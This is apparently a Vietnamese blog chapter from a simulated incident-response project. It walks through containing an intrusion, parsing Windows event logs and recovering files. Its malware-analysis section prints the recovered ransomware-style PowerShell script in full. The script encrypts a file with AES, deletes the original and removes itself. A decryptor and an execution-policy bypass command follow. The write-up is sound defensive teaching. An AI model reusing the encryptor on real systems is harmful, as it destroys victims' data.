---
title: 'End-to-End Incident Response Simulation: From Detection to Recovery'
label: 'CHƯƠNG 6: ĐIỀU TRA & KHÔI PHỤC'
slug: 6-dieu-tra-and-khoi-phuc-dfir-phase
description: >-
  Dự án mô phỏng quy trình SOC khép kín: Từ Monitor, Detection đến Digital
  forensics và Recovery kết hợp Mini-SOAR Engine bằng Python theo kiến trúc bảo
  mật 6 lớp giúp tự động hóa toàn bộ quy trình.
visibility: PUBLIC
---
# CHƯƠNG 6: THỰC THI QUY TRÌNH ỨNG CỨU SỰ CỐ & ĐIỀU TRA SỐ

Phần này mô tả quy trình thực chiến xử lý sự cố dựa trên khung tiêu chuẩn của NIST SP 800-61. Kịch bản bắt đầu ngay khi hệ thống SIEM kích hoạt cảnh báo đỏ về hành vi *Spike Traffic* và *Abnormal Process Creation*. Nhiệm vụ của đội ngũ Blue Team là nhanh chóng khoanh vùng, thu thập chứng cứ pháp lý số và khôi phục hoạt động kinh doanh.

## 1. CÔ LẬP CHIẾN THUẬT & NGĂN CHẶN

Mục tiêu ưu tiên hàng đầu trong giai đoạn này là "cầm máu" cho hệ thống, cắt đứt hoàn toàn kết nối C2 của kẻ tấn công và ngăn chặn quá trình di chuyển ngang cũng như tuồn dữ liệu ra ngoài.

**Bước 1: Vô hiệu hóa Vector Tấn công**

Thông qua phân tích nhanh, WinRM được xác định là dịch vụ bị lợi dụng để thiết lập Interactive Shell. Lệnh khẩn cấp được ban hành để đóng băng dịch vụ này trên Endpoint bị nhiễm.

PowerShell

```plaintext
Stop-Service -Name WinRM -Force
Set-Service -Name WinRM -StartupType Disabled
```

**Bước 2: Phân mảnh Mạng & Áp dụng Zero Trust**

Sử dụng Windows Defender Firewall để thiết lập vòng vây cô lập máy nạn nhân khỏi phần còn lại của mạng doanh nghiệp. Tuân thủ nguyên tắc Đặc quyền tối thiểu, hệ thống sẽ chặn toàn bộ IP lạ và chỉ cho phép danh sách trắng từ dải IP Quản trị.

* **Lệnh chặn IP Kẻ tấn công :** Thiết lập Inbound Rule từ chối mọi lưu lượng từ địa chỉ IP 10.10.10.130.

* **Hardening SSH & SMB:** Triển khai kịch bản PowerShell để tái cấu trúc lại luật tường lửa nội bộ:

PowerShell

```plaintext
# Cho phép SMB từ các IP Quản trị
New-NetFirewallRule -DisplayName "Allow SMB from Trusted IPs" -Direction Inbound -LocalPort 445 -Protocol TCP -Action Allow -RemoteAddress 192.168.225.136,10.10.10.128,192.168.2.0/24 -Profile Any

# Cho phép SSH từ các IP Quản trị
New-NetFirewallRule -DisplayName "Allow SSH from Trusted IPs" -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow -RemoteAddress 192.168.225.136,10.10.10.128,192.168.2.0/24 -Profile Any

# Khóa chặt các kết nối còn lại (Block All Others)
New-NetFirewallRule -DisplayName "Block SMB && SSH from Others" -Direction Inbound -LocalPort 445,22 -Protocol TCP -Action Block -RemoteAddress Any -Profile Any
```

*.*

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1765104270352/fa200e3f-be7a-47ff-8547-9f5164b51ea8.png" alt="" align="left" fullwidth="true" />

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1765104375469/861eb760-4d09-459c-8745-d65f8513f9f2.png" alt="" align="left" fullwidth="true" />

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1765104433188/e4243bb2-9938-4e39-afb5-abdd11fcc8b1.png" alt="" align="left" fullwidth="true" />

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1765104459677/4905a919-5a84-4a1e-aeb0-9d9c501baf9e.png" alt="" align="left" fullwidth="true" />

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1765104490867/278a6e2e-8254-44a0-8362-bfcd0d99c186.png" alt="" align="left" fullwidth="true" />

**Bước 3: Thu hồi Đặc quyền**

Tiến hành Reset Credentials ngay lập tức đối với tài khoản thanh đã bị xâm nhập để cắt đứt khả năng duy trì quyền truy cập của hacker.

## 2. ĐIỀU TRA SỐ & BẢO TOÀN CHỨNG CỨ

Sau khi Endpoint đã được cách ly an toàn, quy trình Pháp y Kỹ thuật số được kích hoạt nhằm tìm ra Nguyên nhân Gốc rễ.

**Công cụ chuyên dụng :**

* **FTK Imager:** Trích xuất dữ liệu hệ thống ở mức logic nhằm đảm bảo "Tính toàn vẹn của Bằng chứng" , giúp sao chép các file log đang bị hệ điều hành khóa .

  <Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1770777068467/82ddaf4b-ed1a-4cc2-a778-d220927a71ed.png" alt="" align="center" fullwidth="true" />

* **EZ Tools :** Bộ engine tiêu chuẩn công nghiệp dùng để parse dữ liệu log thô và xây dựng Dòng thời gian sự kiện.

**Quy trình Trích xuất & Chuẩn hóa:**

Chúng tôi tiến hành thu thập các file EVTX trọng yếu từ đường dẫn C:\Windows\System32\winevt\Logs\\:

1. Security.evtx: Dấu vết đăng nhập, khởi tạo tiến trình.

2. Microsoft-Windows-Sysmon%4Operational.evtx: Hành vi cấp thấp của Process và Network.

3. Microsoft-Windows-PowerShell%4Operational.evtx: Lưu lượng thực thi Script.

Sử dụng EvtxECmd để parse dữ liệu thô sang định dạng CSV phục vụ phân tích:

PowerShell

```plaintext
# Parsing PowerShell Logs
.\EvtxECmd.exe -f "C:\Users\ADMIN\Desktop\log\logs\Microsoft-Windows-PowerShell%4Operational.evtx" --csv "C:\Users\ADMIN\Desktop\PowerShell_Output.csv"

# Parsing Sysmon Logs
.\EvtxECmd.exe -f "C:\Users\ADMIN\Desktop\log\Logs\Microsoft-Windows-Sysmon%4Operational.evtx" --csv "C:\Users\ADMIN\Desktop\sysmon_Output.csv"

# Parsing Security Logs
.\EvtxECmd.exe -f "C:\Users\ADMIN\Desktop\log\logs\Security.evtx" --csv "C:\Users\ADMIN\Desktop\security_Output.csv"
```

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1765104804236/423cc0ee-28ff-4038-a3a7-0a5540c0c2c1.png" alt="" align="left" fullwidth="true" />

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1765104806871/a5579d7a-0785-4a05-93e3-308ed17fdc62.png" alt="" align="left" fullwidth="true" />

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1765104809970/b9e4b9fe-cd27-4efd-b454-2275be271992.png" alt="" align="left" fullwidth="true" />

**Tái dựng Dòng thời gian Tấn công :**

Bằng cách import các file CSV vào Timeline Explorer, chúng ta xâu chuỗi chéo các sự kiện . Mối liên kết giữa Event ID 4624 → Event ID 1 → Event ID 4663 đã vẽ nên toàn bộ Kill Chain.

Đáng chú ý nhất, nhờ chính sách giám sát chủ động, Event ID 4104 đã xuất sắc lưu lại được toàn bộ payload mã độc trên RAM trước khi nó kịp xóa dấu vết.

**Quy trình điều tra được chia làm bước:**

* **Thực hiện tìm kiếm các Event 4625,4624 :**

  <Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1770778567497/4b2b4b20-319f-4f43-87b1-c6d37020a0a9.png" alt="" align="center" fullwidth="true" />

  Ta tìm được timeline hệ thống đã bị xâm nhập.

* Dựa trên các Event 4624 → Truy lại các Event 1 :

  * Tìm các câu lệnh khám phá hệ thống của Attacker :

    <Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1770778735665/f3e0a438-586f-42ef-8470-acfe1ca1d13d.png" alt="" align="center" fullwidth="true" />

    Ta tìm được cách thức hoạt động của attacker, gọi đến lệnh bypass và run file encrypt.ps1 qua Powershell.

* Hình thành timeline của Attacker tìm file encrypt.ps1 qua Event 4104:

  * Tìm được file mã hóa dựa trên các thông tin Attacker đã phải dùng cờ bypass kèm theo thực hiện trên file encrypt.ps1.

    <Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1770779237491/df6bcefd-f9d2-46e2-a549-12aa4dd5834d.png" alt="" align="center" fullwidth="true" />

## 3. DỊCH NGƯỢC RANSOMWARE & KHÔI PHỤC DỮ LIỆU

Trong thực tế doanh nghiệp, việc khôi phục dữ liệu không cần trả tiền chuộc là "chiến thắng" lớn nhất của Blue Team. Nhờ Artifact thu được từ Event ID 4104, quá trình dịch ngược thuật toán mã hóa đã thành công.

**Phân tích Mã độc:**

Đoạn script kẻ tấn công sử dụng là thuật toán AES-256 . Do lỗi sơ đẳng trong khâu vận hành vũ khí, kẻ tấn công đã để lộ cả Khóa giải mã ($KeyBase64) và Vector khởi tạo ($IVBase64) ngay trong bộ nhớ.

*Đoạn mã độc thu được từ Log:*

PowerShell

```plaintext
param (
    [string]$Path = "C:\Program Files\data_important.txt",
    [string]$KeyBase64 = "xIs9zA+U1j2/qW4b5r6t7y8u9i0o1p2a3s4d5f6g7h8=",
    [string]$IVBase64  = "1a2b3c4d5e6f7g8h9i0j1k=="
)

try {
    if (-not (Test-Path $Path)) { throw "Target missing" }

    $Aes = [System.Security.Cryptography.Aes]::Create()
    $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $Aes.Key = [System.Convert]::FromBase64String($KeyBase64)
    $Aes.IV  = [System.Convert]::FromBase64String($IVBase64)

    $Bytes = [System.IO.File]::ReadAllBytes($Path)

    $Encryptor = $Aes.CreateEncryptor()
    $EncryptedBytes = $Encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)

    $DestFile = $Path + ".aes"
    [System.IO.File]::WriteAllBytes($DestFile, $EncryptedBytes)

    Remove-Item -Path $Path -Force
    Write-Host "[+] File Encrypted: $DestFile"
}
catch {
    Write-Error $_
}
finally {
    Remove-Item -Path $MyInvocation.MyCommand.Path -Force
}
```

**Phát triển Công cụ Giải mã :**

Dựa trên Key và IV thu thập được, nhóm dự án đã viết một Decryptor script để đảo ngược quá trình mã hóa, cứu dữ liệu kinh doanh quan trọng mà không bị mất mát.

\*Script Giải mã (\*decrypt.ps1):

PowerShell

```plaintext
param (
    [string]$Path = "C:\Program Files\data_important.txt.aes",
    [string]$KeyBase64 = "xIs9zA+U1j2/qW4b5r6t7y8u9i0o1p2a3s4d5f6g7h8=",
    [string]$IVBase64  = "1a2b3c4d5e6f7g8h9i0j1k=="
)

try {
    if (-not (Test-Path $Path)) { throw "Encrypted file not found" }

    $Aes = [System.Security.Cryptography.Aes]::Create()
    $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $Aes.Key = [System.Convert]::FromBase64String($KeyBase64)
    $Aes.IV  = [System.Convert]::FromBase64String($IVBase64)

    $EncryptedBytes = [System.IO.File]::ReadAllBytes($Path)

    $Decryptor = $Aes.CreateDecryptor()
    $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)

    $OriginalPath = $Path -replace "\.aes$", ""
    [System.IO.File]::WriteAllBytes($OriginalPath, $DecryptedBytes)

    Write-Host "[+] File Decrypted: $OriginalPath"
}
```

**Thực thi & Kiểm chứng:**

1. **Tình trạng ban đầu:** Hệ thống chỉ còn tồn tại file đã bị tống tiền data\_important.txt.aes.

2. **Khởi chạy Decryptor:**

   PowerShell

   ```plaintext
   Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass 
   .\decrypt.ps1
   ```

3. **Kết quả :** File data\_important.txt bản gốc đã được sinh ra. Qua kiểm tra mã băm và mở file đọc thử, tính toàn vẹn của dữ liệu được xác nhận 100% không bị hư hại.

   <Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1765105041911/e0f176b5-72c6-4c45-a789-e49551f61de0.png" alt="" align="left" fullwidth="true" />

   <Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1765105065468/29be5759-93f1-4196-8eef-7e7f5ef5f523.png" alt="" align="left" fullwidth="true" />

Toàn bộ quy trình ứng cứu đã thành công chặn đứng cuộc tấn công, cung cấp đầy đủ Artifact cho báo cáo sự cố và khôi phục hoàn toàn hoạt động giả lập của doanh nghiệp.
